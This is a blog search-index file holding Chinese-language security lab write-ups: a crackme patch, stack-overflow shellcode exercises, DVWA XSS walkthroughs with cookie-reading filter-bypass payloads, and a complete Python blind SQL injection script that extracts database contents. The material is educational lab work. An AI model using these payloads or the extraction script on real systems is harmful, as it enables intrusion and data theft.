<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[网安作业3]]></title>
    <url>%2F2019%2F11%2F19%2F%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3%2F</url>
    <content type="text"><![CDATA[网安作业3. crackme:打开IDA找到判断跳转语句位置 修改跳转指令 应用到程序 运行结果： 正确密码显示错误，错误密码显示正确。 overflow(1):首先输入7个q看一下栈情况 authenticated的值是1 输入8个q 没有执行前，authenticated的值还是1 执行以后，值被覆盖为0 overflow(2):将跳转地址覆盖为验证通过的地址 用ultraedit编辑password文件，任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址。 再运行程序 overflow(3):程序与2的区别是增加了头文件windows.h，buff由8字节变成44字节，有足够空间填入代码。 找到buff地址和返回地址 找到messageboxA入口地址 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;windows.h&gt; typedef void (*FuncPointer)(LPTSTR); // 函数指针 int main()&#123; HINSTANCE LibHandle; FuncPointer GetAddr; // 加载成功后返回库模块的句柄 LibHandle = LoadLibrary("user32"); printf("user32 LibHandle = 0x%X\n", LibHandle); // 返回动态链接库(DLL)中的输出库函数地址 GetAddr=(FuncPointer)GetProcAddress(LibHandle,"MessageBoxA"); printf("MessageBoxA = 0x%X\n", GetAddr); return 0;&#125; 构造password 机器码 汇编指令 解释 33DB XOR EBX,EBX 将EBX寄存器置为NULL 53 PUSH EBX 686A6F6B65 PUSH 656b6f6a Thisjoke 6854686973 PUSH 73696854 8BC4 MOV EAX,ESP EAX里存入字符串指针 53 PUSH EBX 50 PUSH EAX 50 PUSH EAX 53 PUSH EBX B8301D3148 MOV EAX,0x48311D30 调用MessageBoxA FFD0 CALL EAX 由于win10保护机制太强，没有办法显示messagebox 换到xp系统上实现 先找到messageboxA的入口地址 再找到buff起始地址 定位shellcode，找jmp esp指令 12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define DLL_NAME "user32.dll"main()&#123; BYTE* ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) &#123; printf(" load dll erro !"); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4) &#123; //0xFFE4 is the opcode of jmp esp int address = (int)ptr + position; printf("OPCODE found at 0x%x\n",address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf("END OF 0x%x\n", address); done_flag = true; &#125; &#125;&#125; 定位exitprocess入口地址 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;windows.h&gt; typedef void (*FuncPointer)(LPTSTR); // 函数指针 int main()&#123; HINSTANCE LibHandle; FuncPointer GetAddr; // 加载成功后返回库模块的句柄 LibHandle = LoadLibrary("kernel32"); printf("kernel32 LibHandle = 0x%X\n", LibHandle); // 返回动态链接库(DLL)中的输出库函数地址 GetAddr=(FuncPointer)GetProcAddress(LibHandle,"ExitProcess"); printf("ExitProcess = 0x%X\n", GetAddr); return 0;&#125; 修改password文件 机器码 汇编指令 解释 33DB XOR EBX,EBX 将EBX寄存器置为NULL 53 PUSH EBX 686A6F6B65 PUSH 656b6f6a Thisjoke 6854686973 PUSH 73696854 8BC4 MOV EAX,ESP EAX里存入字符串指针 53 PUSH EBX 50 PUSH EAX 50 PUSH EAX 53 PUSH EBX B8EA07D577 MOV EAX,0x77D507EA 调用MessageBoxA FFD0 CALL EAX 53 PUSH EBX B8A2BF817C MOV EAX,0x7C81BFA2 调用exit（0） FFD0 CALL EAX 现在程序就可以正常退出]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA--xss_stored]]></title>
    <url>%2F2019%2F11%2F14%2Fxss-stored%2F</url>
    <content type="text"><![CDATA[DVWA的存储型xss。 级别：lowStored XSS Source12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitize name input $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 分析 isset() 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false trim() 函数作用为移除字符串两侧空白字符或其他预定义字符 stripslashes() 函数用于删除字符串中的反斜杠 mysqli_real_escape_string() 函数会对字符串中的特殊号(\x00，\n，\r，\，&#39;，&quot;，\x1a) 进行转义 在代码中对message，name输入框内容 没有进行XSS方面的过滤和检查 且通过 query 语句插入到数据库中。所以存在存储型XSS漏洞 方法由于name和message输入框均存在xss。但name输入框有字符限制，这里可以使用burpsuite抓包修改name输入框内容： 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; *由于提交的结果存储在数据库中，所以每次刷新页面，输入的恶意代码就会被执行一次 * 级别：mediumStored XSS Source12345678910111213141516171819202122232425&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 分析 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 &lt;b&gt; 标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 htmlspecialchars() 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 方法 抓包修改name输入内容: 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如 &lt;IMG src=1 onerror=alert(document.cookie)&gt; 由于low级别已经注入过，所以打开medium级别会直接弹出cookie 级别：highStored XSS Source123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 分析和上面两个级别一样，抓包修改name内容即可，代码对name输入内容利用正则匹配删除所有关于&lt;script&gt;标签 方法抓包修改name内容为 1&lt;IMG src=1 onerror=alert(document.cookie)&gt;]]></content>
      <categories>
        <category>xss攻击</category>
      </categories>
      <tags>
        <tag>xss攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA--xss_reflected]]></title>
    <url>%2F2019%2F11%2F14%2Fxss-reflected%2F</url>
    <content type="text"><![CDATA[DVWA上的反射型xss。 级别：lowReflected XSS Source123456789101112&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 分析 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。 输入 1&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 查看源码可以发现代码被解释执行了 获取cookie输入 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 级别：mediumReflected XSS Source123456789101112131415&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 分析 Medium级别的代码相对于Low级别的代码使用str_replace函数将输入中的&lt;script&gt;删除 方法 使用双写绕过，输入 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt; 使用大小写绕过，输入 &lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 输入其他标签，如&lt;IMG src=1 onerror=alert(document.cookie)&gt; 结果： 级别：highReflected XSS Source123456789101112131415&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 分析 可以看到High级别的代码使用了 preg_replace 函数执行一个正则表达式的搜索和替换,其中 /&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i 是正则表达式 (.*) 表示贪婪匹配，/i 表示不区分大小写所以在High级别的代码中，所有关于 &lt;script&gt; 标签均被过滤删除了 方法&lt;script&gt; 标签不管用了，但是可以使用其他标签绕过 输入 1&lt;IMG src=1 onerror=alert(document.cookie)&gt;]]></content>
      <categories>
        <category>xss攻击</category>
      </categories>
      <tags>
        <tag>xss攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-SQL_Injection_Blind（sql盲注）]]></title>
    <url>%2F2019%2F11%2F12%2FDVWA-SQL-Injection-Blind%2F</url>
    <content type="text"><![CDATA[DVWA的sql盲注。 SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。 123456盲注中常用的几个函数：substr(a,b,c)：从b位置开始，截取字符串a的c长度 count()：计算总数 ascii()：返回字符的ascii码 length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符 sleep(n):将程序挂起n秒 手工盲注思路 手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。 盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。 123456下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：1.判断是否存在注入，注入是字符型还是数字型 2.猜解当前数据库名 3.猜解数据库中的表名4.猜解表中的字段名 5.猜解数据 级别：lowSQL Injection (Blind) Source12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_GET[ 'Submit' ] ) ) &#123; // Get input $id = $_GET[ 'id' ]; // Check database $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125;?&gt; 分析： Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种： User ID exists in the database.与 User ID is MISSING from the database. 所以这里是SQL盲注漏洞。 漏洞利用 输入1 ，发现 输入 1’， 发现 观察到他这里只会出现正确或者错误的两种页面，判定他是一个布尔盲注 获取数据库长度12345678910111213def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process('get_database_length',i,30) theurl = self.url + "1' and length(database())=&#123;0&#125;%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print('\n==&gt;',self.database_length) else: print("\ncan not get the database_length") 运行结果： 检查页面是否正常12345def check(self,text): if "User ID exists in the database." in text: return True elif "User ID is MISSING from the database." in text: return False 获取数据库名12345678910111213141516def get_database(self): self.database = '' for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + ' get_database',j,self.database_length+1) theurl = self.url + "1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23".format(str(i),str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += '666' if len(self.database) &gt; 0: print('\n==&gt;',self.database) else: print("\n can not get the database") 运行结果： 获取表长123456789101112def get_table_length(self): for i in range(1,50): self.process('get_table_length',i,50) theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print('\n==&gt;',self.table_length) else: print('\ncan not get the table_length') 运行结果： 获取表名1234567891011121314151617def get_table_name(self): name = '' for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_table_name'.format(i),j,50) theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23".format(str(i),str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) &gt; 0: print('\n==&gt;',name) self.table_name.append(name) else: print('\ncan not get the table_name') 运行结果： 获取表列数量1234567891011def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process('get_column_num',i,30) theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23".format(table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print('\n==&gt;',self.column_num) 获取总长度123456789101112def get_column_length(self,table_name): for i in range(1,100): self.process('get_column_length',i,100) theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23".format(table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print('\n==&gt;',self.column_length) else: print('\ncan not get the column_length') 获取列名1234567891011121314151617def get_column_name(self,table_name): name = '' for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_column_name'.format(str(i)),j,100) theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23".format(str(i),table_name,str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) == self.column_length[0]: self.column_name.append(name) print('\n==&gt;',self.column_name[0]) else: print('\ncan not get the column_name') 运行结果： 获取字段数目123456789101112def get_word_num(self,table_name,column_name): for i in range(1,100): self.process('get_word_num',i,30) theurl = self.url + "1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23".format(column_name,table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print('\n==&gt;',self.word_num) else: print('\ncan not get the word_num') 获取列长123456789101112def get_word_length(self,table_name,column_name): for i in range(1,200): self.process('get_&#123;0&#125;_length'.format(column_name),i,200) theurl = self.url + "1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23".format(column_name,table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print('\n==&gt;',self.word_length) else: print('\ncan not get the word length') 获取数据1234567891011121314def get_word_name(self,table_name,column_name,word_num): name = '' for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process('get_&#123;0&#125;_name'.format(str(i)),j,100) theurl = self.url + "1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23".format(column_name,str(i),table_name,str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' self.word_name.append(name) print('\n==&gt;',self.word_name[word_num]) 运行结果： 级别：mediumSQL Injection (Blind) Source1234567891011121314151617181920212223242526&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Check database $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; //mysql_close();&#125;?&gt; 分析medium级别与low级别差不多， 将get方式改成post方式即可，数字型注入。 由于他会过滤单引号，所以需要转成16进制。 12345def tranhex(self,str1): result = '0x' for i in str1: result += hex(ord(i))[2:] return result 运行结果： 级别：highSQL Injection (Blind) Source123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_COOKIE[ 'id' ] ) ) &#123; // Get input $id = $_COOKIE[ 'id' ]; // Check database $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $getid ); // Removed 'or die' to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'; &#125; else &#123; // Might sleep a random amount if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) ); &#125; // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);&#125;?&gt; 分析随便写个1提交 是一个cookie注入 1234def get_headers(self,payload): headers = &#123; 'Cookie': "id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload) &#125; 运行结果： 完整脚本12345678from Injection import Injectiondef main(url): Injection(url).run()if __name__ == '__main__': url = "http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id=" main(url low:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205import requestsimport stringclass Injection: def __init__(self,url): self.url = url self.s = requests.session() self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36] self.headers = &#123; 'Cookie': 'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c' &#125; def process(self,yourstr,num1,num2): print("[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]".format(yourstr,str(num1),str(num2)),end='\r') def check(self,text): if "User ID exists in the database." in text: return True elif "User ID is MISSING from the database." in text: return False def run(self): self.get_itsnum() self.get_database_length() self.get_database() self.get_table_num() self.table_length = [] self.table_name = [] self.get_table_length() self.get_table_name() table_name = input('[-] table_name: ') self.get_column_num(table_name) self.column_length = [] self.column_name = [] self.get_column_length(table_name) self.get_column_name(table_name) column_names = input('[-] column_name: ').split(',') self.word_num = 0 self.get_word_num(table_name,column_names[0]) self.word_name = [] self.word_length = [] for i in range(len(column_names)): print(column_names[i]) self.get_word_length(table_name,column_names[i]) self.get_word_name(table_name,column_names[i],i) def get_itsnum(self): self.itsnum = 0 for i in range(1,50): self.process('get_itsnum',i,50) theurl = self.url + "1' order by &#123;0&#125;%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if not self.check(html): self.itsnum = i - 1 break if self.itsnum &gt; 0: print('\n==&gt;',self.itsnum) else: print("\ncan not get the itsnum") def get_database_length(self): self.database_length = 0 for i in range(1,30): self.process('get_database_length',i,30) theurl = self.url + "1' and length(database())=&#123;0&#125;%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database_length = i break if self.database_length &gt; 0: print('\n==&gt;',self.database_length) else: print("\ncan not get the database_length") def get_database(self): self.database = '' for i in range(1,self.database_length+1): for j in self.zifuji: self.process(str(i) + ' get_database',j,self.database_length+1) theurl = self.url + "1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23".format(str(i),str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.database += chr(j) break if len(self.database) != i: self.database += '666' if len(self.database) &gt; 0: print('\n==&gt;',self.database) else: print("\n can not get the database") def get_table_num(self): self.table_num = 0 for i in range(1,30): self.process('get_table_num',i,30) theurl = self.url + "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_num = i break if self.table_num &gt; 0: print('\n==&gt;',self.table_num) else: print("\ncan not get the table_num") def get_table_length(self): for i in range(1,50): self.process('get_table_length',i,50) theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23".format(str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.table_length.append(i) break if self.table_length[0] &gt; 0: print('\n==&gt;',self.table_length) else: print('\ncan not get the table_length') def get_table_name(self): name = '' for i in range(1,self.table_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_table_name'.format(i),j,50) theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23".format(str(i),str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) &gt; 0: print('\n==&gt;',name) self.table_name.append(name) else: print('\ncan not get the table_name') def get_column_num(self,table_name): self.column_num = 0 for i in range(1,30): self.process('get_column_num',i,30) theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23".format(table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_num = i break if self.column_num &gt; 0: print('\n==&gt;',self.column_num) def get_column_length(self,table_name): for i in range(1,100): self.process('get_column_length',i,100) theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23".format(table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.column_length.append(i) break if len(self.column_length) &gt;= 1: print('\n==&gt;',self.column_length) else: print('\ncan not get the column_length') def get_column_name(self,table_name): name = '' for i in range(1,self.column_length[0]+1): for j in self.zifuji: self.process('&#123;0&#125; get_column_name'.format(str(i)),j,100) theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23".format(str(i),table_name,str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' if len(name) == self.column_length[0]: self.column_name.append(name) print('\n==&gt;',self.column_name[0]) else: print('\ncan not get the column_name') def get_word_num(self,table_name,column_name): for i in range(1,100): self.process('get_word_num',i,30) theurl = self.url + "1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23".format(column_name,table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_num = i break if self.word_num &gt; 0: print('\n==&gt;',self.word_num) else: print('\ncan not get the word_num') def get_word_length(self,table_name,column_name): for i in range(1,200): self.process('get_&#123;0&#125;_length'.format(column_name),i,200) theurl = self.url + "1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23".format(column_name,table_name,str(i)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): self.word_length.append(i) break if len(self.word_length) &gt;= 1: print('\n==&gt;',self.word_length) else: print('\ncan not get the word length') def get_word_name(self,table_name,column_name,word_num): name = '' for i in range(1,self.word_length[word_num]+1): for j in self.zifuji: self.process('get_&#123;0&#125;_name'.format(str(i)),j,100) theurl = self.url + "1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23".format(column_name,str(i),table_name,str(j)) + "&amp;Submit=Submit#" html = self.s.get(theurl,headers=self.headers).text if self.check(html): name += chr(j) break if len(name) != i: name += '|' self.word_name.append(name) print('\n==&gt;',self.word_name[word_num]) 